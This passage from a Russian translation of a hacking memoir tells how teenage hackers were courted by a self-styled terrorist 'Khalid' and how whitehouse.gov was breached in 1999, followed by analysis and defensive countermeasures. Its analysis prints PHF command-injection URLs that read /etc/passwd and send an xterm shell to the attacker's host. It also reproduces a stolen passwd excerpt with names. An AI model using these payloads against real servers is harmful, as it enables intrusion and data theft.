исправиться. «Я посидел под домашним арестом, потом перешел под наблюдение инспектора. Я начал бегать по вечеринкам и они отправили меня на реабилитацию». После реабилитации Comrade получил работу в Интернет-компании и даже организовал свой небольшой Интернет-бизнес. Но при этом ему далеко не всегда удавалось встретиться со своим инспектором, поэтому его все-таки отправили в тюрьму. Тогда ему было всего шестнадцать лет, а приговор он получил в возрасте пятнадцати лет.  В федеральных тюрьмах США совсем немного столь юных заключенных; поэтому место в Алабаме, куда его направили, правильнее было бы назвать «колонией»; кроме него там находилось еще десять заключенных и, по словам Comrade, оно выглядело «как школа, правда, с закрытыми дверями и колючей проволокой, но совсем непохожая на тюрьму». Ему даже не приходилось заниматься уроками, поскольку он уже прошел школьный курс.  Вернувшись в Майами, Comrade опять должен был находиться под постоянным контролем инспектора и ему выдали список хакеров, с которыми ему запрещено было общаться. «В этом списке были перечислены „тот парень“, „этот парень“ и neOh». Имя neOh было указано потому, что правительство знало его только под этой кличкой. «Они не представляли, кто он на самом деле. Если я мог проникнуть в две сотни систем, то он мог это сделать с тысячью», — говорит Comrade. «neOh был крутым хакером». До сих пор американская Фемида не смогла ни узнать его имени, ни определить его местонахождение.   В   ПОИСКАХ   ХАЛИДА   Был ли Халид действительно военным, как он утверждал, или же он просто морочил головы несовершеннолетним хакерам? Или же это была провокация ФБР, направленная на то, чтобы узнать, как далеко могут зайти юные хакеры? В тот или иной момент времени каждый из хакеров, кто общался с Халидом, подозревал, что он не военный: ребят гораздо меньше волновало то, что они передают информацию иностранному шпиону, чем то, что он, возможно, обманывает их. Comrade признавался, что «размышлял очень долго над тем, кто такой Халид. Я не знал — был ли он реальным человеком или провокатором от правительства. Говоря с ним и с neOh, я решил, что он все-таки реален. Но я никогда не брал у него денег — это барьер, который я не хотел переступать». (Чуть раньше в нашем разговоре, когда он впервые упомянул про десять тысяч долларов, что ему предложил Халид, было понятно, что его эта сумма впечатлила. Действительно ли он отказался бы от нее, если бы его попытка кончилась удачей, и Халид заплатил ему? Наверное, даже сам Comrade не смог бы дать ответа на этот вопрос).  По словам neOh, Халид «звучал абсолютно профессионально», он сомневался лишь в его причастности к боевым формированиям. « В с е время, пока я общался с ним. я подозревал, что все это обман. Но потом вместе с приятелями, к которым он также обращался и давал другую информацию, мы пришли к единому мнению, что он именно тот, за кого себя выдает».  Еще один хакер — SavecOre, дружески общался на IRC с человеком, который говорил, что его дядя работает в ФБР и обеспечивает неприкосновенность целой хакерской группе MilwOrm. «Я думаю, что это должно было дать понять ФБР, что мы не враждебно настроены», рассказывал SavecOre журналисту Нэйлу Маккею в интервью по электронной почте. «Поэтому я дал ему свой номер телефона. На следующий день мне позвонил так называемый агент ФБР, но у него был чудовищный пакистанский акцент».  «Он сказал, что его зовут Майкл Гордон и что он из отделения ФБР в Вашингтоне», — рассказывал SavecOre журналисту «Я понял, что это восточный человек». Пока кое-кто из хакеров рассуждал, не может ли этот террорист быть подсадной уткой ФБР SavecOre пришел к противоположному выводу: что человек, претендующий на роль агента ФБР был тот же террорист, проверяющий, не хотят ли ребята его «заложить».  Все что происходило, не было похоже на операцию ФБР по одной простой причине. Если бы правительство действительно хотело узнать, на что способны юные хакеры, то оно выделило бы деньги на эту операцию. Когда ФБР подозревает, что ситуация достаточно серьезна для того, чтобы предпринимать реальные шаги, с деньгами задержки быть не может. Обещать neOh тысячу долларов и не платить не имело никакого смысла.  На самом деле только один хакер — Chameleon — получил от Ха-лида хоть какие-то деньги. «Однажды утром я нашел в своем почтовом ящике чек на тысячу долларов и просьбу позвонить в Бостон», Chameleon был тем хакером, который рассказал одну интересную историю в журнале Wired (в номере от 4 ноября 1998 г.). Из нее Халид узнал, что у него есть схемы правительственных компьютерных сетей и чек был платой за эти карты. Chameleon обналичил свой чек. Через две недели его задержали агенты ФБР и допрашивали его по поводу этого чека. Он был в совершенном недоумении, как правительство узнало об этой тысяче долларов. Это было еще до трагических событий 11 сентября, когда ФБР активизировало свою деятельность внутри страны, и отслеживало все ниточки, которые могли привести к террористам. Chameleon признал, что получил деньги, но в интервью журналисту настаивал, что не передавал никому схем правительственных сетей.  Хотя он признался в том, что принял деньги от иностранного террориста, что могло привести к обвинению в шпионаже, и ему светило очень долгое заключение, никаких обвинений ему выдвинуто не было, что делало случай еще более загадочным. Вполне возможно, что правительство просто хотело предупредить хакерское сообщество, что иметь дело с иностранными шпионами рискованно. Может быть даже, чек пришел Chameleon не от Халида, а от ФБР.  Мало кто знает настоящее имя Chameleon, и он стремится как можно дольше продлить такое положение вещей. Мы хотели услышать его версию этой истории. Он отказался говорить на эту тему (выдавив из себя только то. что он принимал Халида за сотрудника ФБР, выдающего себя за террориста). Если бы я был на его месте, скорее всего, я бы тоже не хотел говорить о той истории.   «ХАРКАД  УЛЬ  -  МУДЖАХИДДИН»   Исследуя записи на IRC-сайтах, журналист Маккей обнаружил, что однажды Халид представился молодым хакерам, как член организации «Харкад уль-Ансар» [3] . По данным обзора разведки по Юго-Восточной Азии, так называлась антиамериканская террористическая организация, связанная с саудовским террористом Осамой бен Ладеном еще с 1997 года. Чтобы избежать проблем со стороны США  в 1998 году группа была переименована в «Харкад уль-Муд-жахиддин» [4] .  Государственный департамент США неоднократно предостерегал всех об опасности этой группы. Одно из обращений звучало так: «Пакистанские официальные лица сообщили, что после налета американских самолетов 23 октября 2001 года было убито 22 пакистанских партизана, которые сражались рядом с бойцами Талибана около Кабула. Все убитые были членами „Харкад уль-Муджахиддин“ — организации, которая была внесена в официальный список террористических организаций Государственного Департамента в 1995 году» [5] .  На самом деле «Харкад» сегодня — это одна из 36 групп, называемых Госдепартаментом иностранными террористическими организациями. Другими словами, правительство США считает их самыми плохими существами на планете.  Естественно, молодые хакеры ничего об этом не знали. Для них все, что они делали, было игрой.  Что касается Халида, то генерал-майор вооруженных сил Индии, выступая с лекцией на тему информационной безопасности в апреле 2002 года, подтвердил, что есть такой террорист, говоря о связях хакеров с «Халидом Ибрагимом из пакистанской организации „Харкад уль-Ансар“ [6] . Генерала заботило то, что Халид располагался не в Пакистане, а на родине генерала — в Дели (Индия).   ПОСЛЕДСТВИЯ   11   С  Е  Н  Т  Я  Б  Р  Я   (9/11)   Хакеры всегда манипулируют и обманывают. Они дурят компьютерные системы, заставляя их думать, что у них есть авторизация, которую они на самом деле украли, они используют методы социальной инженерии, чтобы манипулировать людьми для достижения своих целей. Поэтому, разговаривая с хакером, надо внимательно слушать, что он говорит и то, как он это говорит, чтобы попытаться понять, можно ли ему верить. Иногда до конца понять это невозможно.  Мы с моим соавтором не уверены в том, что neOh искренне говорил нам о своей реакции на 9/11. Мы изо всех сил старались понять его ощущения:  «Вы знаете, как я рыдал в тот день? Я чувствовал, что моя жизнь окончена».  Эти слова сопровождались нервным смешком — что он означал? Мы незнаем.  « Е с л и подумать, то я должен был что-то с д е л а т ь с этим. Е с л и бы я попал в Lockheed Martin или Boing и получил там больше информации, то они могли бы ее использовать. Это было страшное время не только для Америки, но и для меня.  Я плакал, потому что не хотел им помогать. Они меня наняли за мой талант, но если я хоть немного причастен к тому, что случилось  с башнями Торгового центра… Э т а мысль просто убивала меня!  На самом деле у меня три друга погибли в тот ужасный день, мне никогда не было так плохо».  Многие хакеры начинают заниматься хакерством в подростковом возрасте, а то и раньше. Не слишком ли рано это для того, чтобы распознать потенциальную угрозу твоей стране, когда кто-то просит вас о чем-то? Хотелось бы думать, что 9/11 сделало американских хакеров — даже самых юных — подозрительными в том плане, чтобы не быть игрушкой в руках террористов. Надеюсь, я прав.   БЕЛЫЙ   ДОМ   ВМЕШИВАЕТСЯ   История компьютерной безопасности в некотором смысле параллельна истории криптографии. В течение столетий создатели кодов разрабатывали шифры, которые они считали «невзламываемыми». Даже сегодня, когда в новых поколениях компьютеров послание шифруется практически мгновенно при помощи ключей в сотню символов, большинство кодов остаются взламываемыми. (Организация, где разрабатываются и взламываются коды, обладает самыми большими, быстрыми и мощными в мире компьютерами — это Национальное агентство по безопасности).  Компьютерная безопасность похожа на игру кошки и мышки, где на одной стороне выступают эксперты по безопасности, а на другой — хакеры. Код операционной системы Windows содержит десятки миллионов строчек кодов. Естественно, в такой большой программе опытный хакер всегда сможет найти лазейку.  Тем временем обычные работники компании, чиновники, иногда даже сотрудники службы безопасности, устанавливая новый компьютер или приложение, меняя пароль или создавая новый, совершенно безопасный, оставляют свой компьютер уязвимым.  Если вы читаете новости о хакерских атаках и вторжениях, то должны знать, что хакерам удается проникнуть на военные и правительственные сайты и даже на Интернет-сайт Белого Дома. Иногда по нескольку раз.  Проникнуть на Интернет-сайт и поменять его содержание — это еще полдела, чаще всего это не так сложно сделать. До сих пор многие люди используют один и тот же пароль для различных случаев: если при проникновении в сеть вам удалось получить доступ к паролям, то, скорее всего, вы сможете получить доступ и к другим системам в сети и достигнуть больших результатов. neOh рассказывал, как в 1999 году он с другими членами группы gLobaLheLL сделал именно это с одним из самых чувствительных мест в США — с сайтом Белого Дома. «В тот момент Белый Дом переустанавливал операционную систему на своих компьютерах. Там сломалось буквально все. И за эти десять-пят-надцать минут Zyklon и MostFearD успели проникнуть внутрь, добраться до файла с паролями, прочесть его и изменить Интернет-сайт. Я был рядом с ними, когда они проделывали все это.  Очень важно бывает оказаться в нужное время в нужном месте. Им это удал о с ь с л у ч а й н о — б ы т ь как р а з н а линии, когда с а й т н а ч а л обновляться. Мы обсуждали это в чате gLobaLheLL Около трех ночи меня разбудил телефонный звонок, и они сообщили, что делают это. Я сказал: «Зашибись! Покажите!». Я просто прыгнул за мой компьютер. Действительно, они сделали это.  MostFearD и Zyklon сделали большую часть работы. Они переслали мне файл с паролями для взлома. Я добыл один пароль — простое слово из словаря. Это было главное».  neOh предоставил нам часть этого сайта с паролями, который его коллеги извлекли и переслали ему, в этой части приведены пароли некоторых известных пользователей из персонала Белого Дома 7  .  neOh никогда не говорил, что текст был в онлайн-доступе.   root:x:0:l:Super-User:/:/sbin/sh  daemon:x:l:l::/:  bin:x:2:2::/usr/bin:  sys:x:3:3::/:  adm:x:4:4:Admin:/var/adm:  uucp:x:5:5:uucp Admin:/usr/lib/uucp:  nuucp:x:9:9:uucp  Admin:/var/spool/uucppublic:/usr/lib/uucp/uucico  listen:x:37:4: Network Admin:/usr/net/nls:  nobody:x:60001:60001 :Nobody:/:  noaccess:x:60002:60002:No Access User:/:  nobody4:x:65534:65534:SunOS 4.x Nobody:/:  bing:x: 1001:10:Bing F e r a r e n : / u s r / u s e r s / b i n g : / b i n / s h  orion:x: 1002:10:Christopher  Adams:/usr/users/orion:/usr/ace/sdshell  webadm:x:1130:101:Web  Administrator:/usr/users/webadm:/bin/sh  cadams:x:1003:10:Christopher  Adams:/usr/users/cadams:/usr/ace/sdsbell  barth om :x:1004:101:Mark   Подтвердить это трудно. Поскольку атака произошла во время правления президента Клинтона, никто из перечисленных людей уже не работал в Белом Доме. Удалось отыскать лишь несколько свидетельств. Монти Хьямч делал видеозаписи, Кристофер Аламс — имя журналиста из Financial Times, английской газеты — как нам удалось выяснить, в Белом Доме не было сотрудника с таким именем. Дебра Рейд — это фотограф из Associated Press. В Белом Доме не было сотрудника по имени Кони Колабисто; ж е н щ и н а с таким именем была женой Женэ Колабисто. президента компании по решениям для создания изображений, но совершенно непонятна их связь с Белым Домом.   Bartholomew:/usr/users/barth om :/usr/ace/sdshell  monty:x:1139:101:Monty  Haymes:/usr/users/monty:/bin/sh  debra:x:1148:101:debra  Reid:/usr/users/debra:/bin/sh  connie:x:1149:101:Connie  Colabastistto:/usr/users/connie:/bin/sh bill:x:1005:101:William Hadley:/usr/users/bill:/bin/sh   Это типичная форма файла паролей в Unix или Linux, когда зашифрованные пароли хранятся в отдельном защищенном файле. Каждая строка соответствует имени человека, имеющего учетную запись в этой системе. Слово «sdshell» в некоторых строках означает. что эти пользователи в целях дополнительной безопасности носят с собой маленькое электронное устройство под названием «RSA Secure ID», которое показывает шестизначное число, изменяющееся каждую минуту. Чтобы войти в компьютер, эти пользователи должны набрать шестизначное число, которое в данный момент показывает их устройство вместе с определенным PIN-кодом (который выдается руководством в одних компаниях или же выбирается самостоятельно в других). Сайт Белого Дома был искажен практически в тот же момент, как они его взломали, чтобы показать, что они уже оказались там — так рассказывает neOh, который и предоставил им картинку для искажения сайта 8  . Кроме эмблемы группы хакеров gLobaLheLL на этой странице был еще текст Hong Kong Danger Duo. По словам neOh, это было написано без особого смысла, просто чтобы заполнить страницу сайта.   http://www.attrition.org/mirror/attrition/1999/05/10/www.whitehouse.gov/mirror.html   Как вспоминает neOh, ребята, которые хакнули Белый Дом, не чувствовали никакой особой гордости по тому поводу, что им удалось проникнуть на один из десятка самых охраняемых в США Интернет-сайтов. Они постоянно «были заняты тем, что проникали повсюду», объясняет neOh, «чтобы доказать всему миру, что мы самые крутые». Вместо того, чтобы устраивать виртуальные пляски по поводу удачного взлома, все, что они могли сказать друг другу по этому поводу: «Хорошая работа, парни, мы сделали это. Кто следующий?»  Но у них уже оставалось не так много времени для того, чтобы делать следующие взломы. Их мирок уже близился к распаду и в этой части истории опять появляется таинственный Халид.  Теперь Zyklon, известный еще как Эрик Бернс, берет нить повествования в свои руки. Он даже не был членом группы gLobaLheLL, по его словам, а просто тусовался на сайтах IRC с некоторыми ребятами. Проникновение на сайт Белого Дома, как он рассказывает, стало возможным после того, как он обнаружил «дыру» в программе под названием PHF, которая использовалась для доступа к базе данных телефонов. Именно эта «дыра» стала уязвимым местом сайта, о ней знали многие в хакерском сообществе, «но немногие люди использовали ее», говорит Zyklon.  Выполнив некоторую последовательность шагов (подробное описание которой приведено в разделе «Анализ» в конце главы), он смог проникнуть в корневую директорию на сайте whitehouse.gov и получить доступ к другим системам локальной сети, включая и сервер электронной почты Белого Дома. После этого Zyklon получил возможность перехватывать любую переписку между сотрудниками Белого Дома и внешним миром, хотя, естественно, в этих письмах не содержалось никакой секретной информации.  Zyklon также отметил, что он смог «получать копии секретных файлов и файлов паролей». Они тусовались на этом сайте, просматривая, что там есть интересного и дожидаясь, пока сотрудники начнут приходить на работу. Как раз в это время ему позвонил Халид, который сказал, что пишет статью о самых последних хакерских успехах и не может ли ему Zyklon рассказать что-нибудь «свеженькое». «Я сказал ему, что мы как раз сейчас находимся на Интернет-сайте Белого Дома», — вспоминал Zyklon.  Через несколько часов после этого разговора, рассказывал мне Zyklon, он заметил, что на сайте появился «нюхач» — это системный администратор решил проверить, что происходит на сайте и попытаться установить, кто на нем находится. Что это — случайное совпадение? Или в этот момент появились причины стать подозрительным? Прошли месяцы, пока Zyklon не нашел ответа на этот вопрос. Как только он обнаружил «нюхач», все хакеры отсоединились от сайта, надеясь, что они заметили администратора быстрее, чем он заметил их присутствие.  Однако, образно говоря, они разворошили осиное гнездо. Через две недели сотрудники ФБР задержали всех членов gLobaLheLL, кого им удалось идентифицировать. Кроме Zyklon (19 лет, задержан в Вашингтоне), они схватили MostHateD (Патрик Грегори, 19 лет, Техас), MindPhasr (Чад Дэвис, Висконсин) и других.  neOh оказался одним из тех, кому удалось уйти. Наслаждаясь ощущением свободы в своем убежище, он решил послать на сайт Белого Дома оскорбительное сообщение. Вот как оно выглядит: «Слушайте, Вы, м….и долбаные из ФБР. Не дое…есь до нас, вы все равно проиграете. Ваш домен fbi.gov в наших руках. БОЙТЕСЬ НАС. Вам удалось арестовать нас, поскольку вы, тупые идиоты, смогли вычислить, кто хакнул Белый Дом, верно? Поэтому вы хватаете нас всех и смотрите — кто из нас нарк. ОБЛОМИТЕСЬ, КОЗЛЫ ГРЕБАНЫЕ, МЫ НЕ НАРКУШИ. Понятно? МЫ — ПОВЕЛИТЕЛИ МИРА!»  И подписался: «neOh, немилосердный».   ПОСЛЕДСТВИЯ   Как же так случилось, что ранним утром системный администратор решил установить на сайте «нюхач»? Zyklon не сомневался в ответе. Когда представители прокуратуры обнародовали свои материалы по данному случаю, он обнаружил там упоминание о том, что информацию о взломе сайта Белого Дома группой gLobaLHeLL предоставил информатор ФБР. Как припоминает Zyklon, там было написано, что этот информатор живет в Нью-Дели, Индия.  По мнению Zyklon, больше никаких сомнений не оставалось. Единственный человек, которому он говорил о взломе Белого Дома, был Халид Ибрагим. Один плюс один равно двум: Халид был информантом ФБР.  И все же оставалась некоторая неясность. Даже если Zyklon прав, то вся ли это правда? Кто такой Халид — информатор, помогающий ФБР отлавливать юных хакеров, стремящихся взломать важные сайты? Или же есть иное объяснение: то, что он информатор — это только полправды: кроме этого, он пакистанский террорист, как считает и индийский генерал. Он играет роль двойного агента, сотрудничая и с Талибаном, и с ФБР.  Его постоянные опасения, что кто-то из ребят донесет о нем в ФБР, вполне вписываются в эту версию.  Наверняка всю правду о ситуации знали совсем немного людей. Были ли среди них сотрудники ФБР и прокураторы или же их так же дурачили?  В конце концов, Патрик Грегори и Чад Дэвис были приговорены к двадцати шести месяцам, a Zyklon Бернс — к пятнадцати месяцам. Все трое уже отбыли свои сроки и вышли из тюрьмы.   ПЯТЬ   ЛЕТ   СПУСТЯ   Сейчас хакерство для Comrade в общем-то, только воспоминание. но и сейчас он заметно оживляется, когда говорит о том, что «это так заводит — делать то, что тебе нельзя делать, лезть туда, куда тебе лезть нельзя, или идти туда, куда нельзя ходить, в поисках чего-нибудь действительно клевого».  Но пора уже и взрослеть. Он говорит, что подумывает о колледже. Мы разговаривали с ним вскоре после того, как он вернулся из лагеря скаутов в Израиле. Язык не оказался проблемой — он учил иврит в школе и был удивлен тем, насколько хорошо он его помнит.  Его впечатления от страны были самые разные. Девчонки были «действительно классными», оказалось, что израильтяне очень любят Америку. «Казалось, что они берут пример с американцев». Как-то он был с несколькими израильтянами, которые пили напитки. о которых он никогда не слышал, под названием RC Cola: оказалось, что это американские напитки. Как объяснили израильтяне, «в рекламе говорилось, что американцы пьют именно эти напитки». Он встретил там и «некоторые антиамериканские настроения у людей, которые не были согласны с политикой США», но воспринял это спокойно: «я подумал, что такое можно встретить везде».  Ему очень не понравилась погода, — во время его пребывания «было холодно и дождливо». Были проблемы и с компьютерами. Он купил ноутбук с возможностью беспроводной связи специально для путешествия, но обнаружил, что «дома построены из огромных толстых камней». Его компьютер зарегистрировал пять или даже десять сетей, но сигнал был слишком слабым для соединения, и приходилось идти двадцать минут до того места, где он мог бы установить надежную связь.  Итак, Comrade вернулся в Майами. Совсем еще молодой человек с уголовным преступлением за плечами, он живет в унаследованном доме и собирается принять решение — поступать или не поступать в колледж. Ему двадцать лет и он умеет делать совсем не так уж много.  Старый приятель Comrade neOh работает в крупной телефонной компании (работа с девяти до пяти ему совсем не нравится), но скоро он на три месяца поедет в Лос-Анджелес, где поработает в какой-то лаборатории, потому что там платят во много раз больше, чем он сейчас зарабатывает. Участвуя в жизни общества, он надеется отложить достаточно для того, чтобы купить себе домик там, где он живет.  После того, как трехмесячная «халтура» завершится, neOh тоже подумывает поступить в колледж, но не для того, чтобы изучать компьютерные науки. «Большинство людей со степенью в компьютерных науках, которых я встречал, знали кучу всякого бесполезного дерьма», — говорит он. Он собирается стать экспертом в бизнесе и управлении компаниями, и намерен выйти на компьютерный рынок на серьезном уровне.  Разговор о его старых подвигах возродил в памяти его преклонение перед Кевином. До какой степени он вообразил себя моим последователем?  « Х о т е л ли я, чтобы м е н я поймали? И да, и нет. Б ы т ь пойманным означал о продемонстрировать всем: „ Я могу с д е л а т ь это, я с д е л а л это“. Б ы т ь пойманным совсем не было для меня главным, но я хотел быть пойманным, чтобы победить их, освободиться и быть хакером, который освободился. Выйдя, я получил бы хорошую работу в правительственном агентстве и установил бы контакты с андерграундом».   НАСКОЛЬКО   ВЕЛИКА   УГРОЗА  ?   Сочетание усилий профессиональных террористов и бесстрашных юных хакеров может быть совершенно разрушительно для страны. Рассказанный эпизод заставил меня подумать, как много таких же «халидов», жаждущих больших денег, самоутверждения или достижения своих целей, вербуют несмышленых детей (или же агрессивно настроенных взрослых хакеров). Помощники новых «халидов» могут гораздо лучше замаскироваться и их будет труднее отыскать.  Когда я находился в предварительном заключении по обвинению в своих хакерских делах, со мной несколько раз общался один крупный колумбийский наркоторговец. Ему угрожало пожизненное заключение без возможности обжалования. Он предложил выгодную сделку — заплатить мне пять миллионов долларов наличными, если я проникну в «Центр» — компьютерную систему Федерального управления тюрем — и освобожу его из заключения. Этот человек говорил совершенно серьезно и наверняка выполнил бы свое обещание. Я не принял его предложения, но сделал вид, что готов ему помочь, чтобы избежать проблем с ним. Я не знаю, как поступил бы neOh в подобной ситуации.  Наши враги могут серьезно готовить своих солдат для ведения компьютерной войны, для атак на нашу инфраструктуру и для защиты своей. Очевидно, что эти группы будут привлекать себе на помощь умелых хакеров со всего мира, чтобы они «натаскивали» солдат для выполнения спецзадании.  В 1997 и в 2003 гг. Министерство обороны проводило специальную операцию (Operation Eligible Receiver) — для того, чтобы проверить уязвимость США перед электронной атакой, В соответствии с отчетом, опубликованным в «Washington Times» 10 о результатах первой такой проверки, «высшие чины Пентагона были потрясены демонстрацией того, как легко хакеры взламывали американские военные и гражданские компьютерные сети». Далее в статье говорилось, что Национальное агентство по безопасности срочно собрало группу компьютерных экспертов — «red team» (Специальный термин, означающий: проверка содержания и качества квалифицированными специалистами, не принимавшими участия в подготовке продукта. Смысл работы red team — проверка систем, программ, военных планов теми, кто может думать, как бандит, хакер, террорист и т. д. —  прим.ред.) для «мозгового штурма». Их задачей было проанализировать возможности хакеров. Им разрешалось работать только на общедоступном компьютерном оборудовании, используя хакерс-кие средства, включая программы, которые они загружали себе из Интернета или создавали сами.  Через несколько дней группа смогла проникнуть в компьютерные системы, управляющие энергетической сетью и с помощью серии команд могла лишить часть страны электричества. «Если бы действия группы были реальными». — писал тогда журнал «Christian Science Monitor», «они могли бы разрушить коммуникационные системы Министерства обороны (вывести из строя большинство тихоокеанских подразделений) и получить доступ к компьютерным системам на борту военно-морских кораблей США» 11  .  В моем личном послужном списке есть несколько побед над механизмами безопасности, которые используют американские телефонные компании для управления доступом к телефонным станциям. Лет десять назад у меня был полный контроль над большинством переключателей таких крупнейших американских телефонных операторов, как Pacific Bell, Sprint, GTE и многие другие. Представьте себе, какой хаос мог возникнуть, если бы такие возможности оказались доступными группе террористов.  Члены Аль-Кайды и других террористических групп используют компьютеры при планировании своих террористических актов. Есть доказательства того, что и при планировании атак 9/11 террористы использовали Интернет.  Если даже Халиду Ибрагиму удалось получить какую-то информацию у кого-то из юных хакеров, ни один из них не сознается в этом. Если он действительно был связан с атаками на башни Всемирного торгового центра и Пентагон, то доказательств этому нет. Нет сведений и о том, когда он или кто-то из его подручных появятся опять на компьютерной сцене в поисках несмышленых помощников, которые испытывают непреодолимое желание «делать то, что тебе нельзя делать, лезть туда, куда тебе лезть нельзя, или идти туда, куда нельзя ходить, в поисках чего-нибудь действительно клевого». Таких помощников, которые могут считать поставленные перед ними задачи «крутыми».  Для молодых хакеров слабая безопасность остается непреодолимым соблазном. Хакеры, о которых идет речь в этой истории, вынуждены были признать, насколько опасно выполнять задания иностранных заказчиков по проникновению в секретные американские компьютерные сети. Можно только предполагать, сколько других «neOh» были завербованы нашими врагами.  Безопасность стала жизненно важным делом, поскольку мы живем в мире, населенном террористами.   АНАЛИЗ   neOh подробно рассказал нам, как он проник в компьютерную систему компании Lockheed Martin. Его рассказ является важным свидетельством, — как пример и для хакеров («Если в системе безопасности есть лазейка, то мы отыщем ее» — таков их лозунг), так и для служб компьютерной безопасности в любой организации.  Он быстро определил, что в компании Lockheed Martin используется собственный сервер доменных имен (DNS — Domain Name Server). DNS — это Интернет-протокол, который, например, транслирует имя сайта  www.disney.com в 198.187.189.55 — адрес, который может использоваться для маршрутизации пакетов. neOh знал, что группа исследования безопасности в Польше опубликовала то, что хакеры называют «exploit» (подвигом или достижением) — программу, специально созданную для атаки одного конкретного уязвимого места в версии DNS, которую использовала компания Lockheed.  Компания использовала разновидность DNS-протокола под названием BIND (Berkeley Internet Name Domain). Польская группа обнаружила. что одна из версий BIND уязвима перед определенным типом атак (переполнение удаленного буфера) и именно эта версия используется в Lockheed Martin. Следуя инструкциям статьи, neOh смог получить привилегии администратора на обоих серверах компании Lockheed.  После получения этих привилегий neOh организовал перехват паролей и электронной почты при помощи программы «вынюхивания», которая действует, как своеобразное подглядывающее компьютерное устройство. Любой посланный трафик эта программа перехватывает; обычно хакер пересылает перехваченную информацию туда, где ее невозможно найти. Чтобы спрятать координаты «нюхача», рассказывает neOh, он создал директорию без имени, тo есть «var/adm/…». При проверке системный администратор вполне мог и пропустить такую незаметную ссылку.  Подобная техника маскировки программ «вынюхивания» очень эффективна и совсем проста; для сокрытия следов хакерского вмешательства есть много более сложных методов.  Не успев найти пути проникновения в сеть Lockheed Martin для получения секретной информации компании, neOh переключился на другую задачу, поэтому секретные файлы остались нетронутыми,  При проникновении на сайт Белого Дома, как рассказывает Zyklon, он вначале запустил программу под названием CGI-сканер. которая сканирует систему на предмет поиска CGI-лазеек. Он обнаружил, что Интернет-сайт уязвим перед атаками, использующими «PHF-дырку», действие которой основано на программной ошибке, сделанной разработчиками в тексте PHF (телефонной книги).  PHF — это своеобразный интерфейс, который устанавливает соответствие между именем на входе и отыскивает соответствие ему на сервере. Программа вызывает функцию escap eshell cmd(), которая должна проверять входные данные на наличие в них специальных знаков. Но программисты исключили из этого списка знаков знак перехода на новую строку. Именно это и может использовать умелый хакер, включив во входную информацию этот знак (ОхОа) в расшифрованном виде. Посыл строки с этим знаком превращает текст в команду для исполнения, написанную хакером.  Zyklon напечатал в своем браузере такой адрес:   http://www.whitehouse.gov/cgi-  bin/phf?Qalias=x%0a/bin/cat%20/etc/passwd  После этого он смог получить доступ к файлу паролей для white-house.gov. Но он стремился получить полный контроль над сервером Белого Дома. Он знал, что скорее всего порты Х-сервера будут защищены специальным экраном, который помешает ему соединиться с любым из сервисов на whitehouse.gov. Вместо этого он опять использовал «PHF-дырку». напечатав:  http://www.whitehouse.gov/cgi-  bin/phf?Qalias=x%Oaa/usr/X11R6/bin/xterm%20-ut%20-display%20zyklons.ip.adress:0.0  Это привело к посылке xterm с сервера Белого Дома на его компьютер, работающий на сервере X. Таким образом, вместо того, чтобы соединяться с whitehouse.gov, он дал команду системе Белого Дома соединиться с ним. (Это возможно только в том случае, когда защитный экран допускает исходящие соединения — именно такой случай и был реализован в данной ситуации).  Затем он использовал уязвимость перегрузки буфера в системной программе ufsrestore. По словам Zyklon, это позволило ему получить доступ к корневой директории whitehouse.gov, так же как и доступ к почтовому серверу Белого Дома и другим системам сети.   КОНТРМЕРЫ   Описанные здесь «подвиги» neOh и Comrade поднимают две серьезные проблемы.  Первая достаточно проста и хорошо известна: используйте только последние релизы операционных систем и приложений в вашем ПО. Это очень важно, поскольку в них устранены все найденные прорехи в системе безопасности. Причем это не должно делаться случайным образом. Все компании должны разработать специальные программы оповещения ИТ-персонала о том, что появилась очередная заплатка для той или иной программы, имеющейся в их арсенале.  Как только эта заплатка становится готовой к использованию, она должна быть установлена как можно быстрее, пока из-за нее не нарушилась работа ПО компании. Легко представить себе перегруженность ИТ-сотрудников, которые заняты повседневной работой (подключение компьютеров новых пользователей — это лишь одна из таких рутинных задач), и установка подобных заплат для них — лишняя головная боль. Надо убедить их, что пропуск хотя бы одной заплатки создает очень высокий риск для всей организации.  Хакеры смогли проникнуть в огромное число систем лишь потому, что в них своевременно не были установлены заплатки. После того, как та или иная лазейка становится известной, риск проникновения во все компьютеры резко нарастает до тех пор пока производители ПО не создадут устраняющую её заплатку и не распространят ее среди пользователей.  Любая организация должна сделать установку подобных заплаток одной из приоритетных задач ИТ-службы. разработав при этом методику максимально быстрого получения информации о заплатках и установки их с минимальными помехами основному процессу ведения бизнеса.  Но даже такое тщательное отслеживание всех появляющихся лазеек и заплаток недостаточно, как подчеркивает neOh, поскольку некоторые взломы, в которых он участвовал, происходили буквально в «час икс», когда обнаруживалась лазейка — она еще не была известна никому, кроме нескольких экспертов-хакеров. Производители ПО и эксперты в области безопасности физически не успевали создать защиту от нее.  Поскольку всегда остается вероятность, что в вашу систему проникнут именно в «час икс», каждая компания уязвима все то время, пока не появится заплатка к новой лазейке. Как же снизить риск?  На мой взгляд, единственное эффективное решение — использовать модель «глубокой защиты». Мы должны исходить из того, что наша компьютерная система в какой-то момент времени будет подвержена атаке в «час икс». Поэтому мы должны создать такое окружение, которое смогло бы минимизировать возможный вред от проникновения плохих парней в нашу систему. Один из примеров, как уже говорилось, это поместить такую компьютерную систему в « D M Z » , то есть — за межсетевой экран. Термин «DMZ» — демилитаризованная зона — взят из обихода военных и политиков, в данном случае он означает, что компьютеры общего доступа (Интернет-сервера, почтовые сервера, DNS-сервера и т.п.) изолированы от корпоративной сети и мест хранения секретной информации. Такая организация компьютерной сети компании — это один из примеров «глубокой защиты».  Даже если хакер обнаружит ранее неизвестную никому лазейку на Интернет-сервере или почтовом сервере и использует ее, он не сможет дотянуться до корпоративной информации благодаря наличию следующего уровня защиты.  Следующая эффективная контрмера против хакеров — это контроль сети или даже отдельных ее компьютеров на необычную или подозрительную активность в ней. Атакующий обычно предпринимает определенный набор действий для того, чтобы проникнуть в систему, таких, как попытки получить зашифрованные или обычные пароли, установка «черного хода», изменение файлов конфигурации для ослабления безопасности, модификация системы, приложений или log-файлов и др.  Если организовать постоянно действующий процесс, который отслеживал бы типичные для хакеров виды активности и подавал персоналу сигнал тревоги при их обнаружении, то можно было фиксировать попытки вторжения в систему.  В качестве отдельной темы стоит упомянуть, что пресса несчетное число раз спрашивала меня о наилучших способах защиты вашего компьютера и бизнеса в современных условиях. Один из основных моих советов — использовать более серьезную авторизацию, чем обычные пароли. Обычно вы понимаете, что кто-то украл ваш пароль только после того, как обнаруживаете последствия этого.  Есть много разных технологий авторизации второго уровня, которые можно использовать в сочетании с традиционными паролями, чтобы обеспечить более высокий уровень безопасности. Вдобавок к RSA Secure ID, упомянутой раньше. Safeword Premier 